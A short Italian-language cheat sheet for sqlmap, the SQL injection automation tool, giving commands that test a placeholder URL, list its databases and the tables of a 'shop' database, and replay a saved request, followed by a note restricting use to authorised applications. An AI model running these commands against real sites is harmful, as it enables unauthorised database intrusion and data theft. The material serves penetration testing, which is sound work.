# SQLmap - automazione SQL injection

## Uso base
```
sqlmap -u "http://sito/page.php?id=1"            # test automatico
sqlmap -u "http://sito/page.php?id=1" --dbs      # elenca i database
sqlmap -u "http://sito/page.php?id=1" -D shop --tables
sqlmap -r richiesta.txt --batch                  # usa una richiesta salvata
```
`--batch` accetta i default; `--risk`/`--level` aumentano la profondita'.

## Legale
Solo su applicazioni di tua proprieta'/autorizzate.
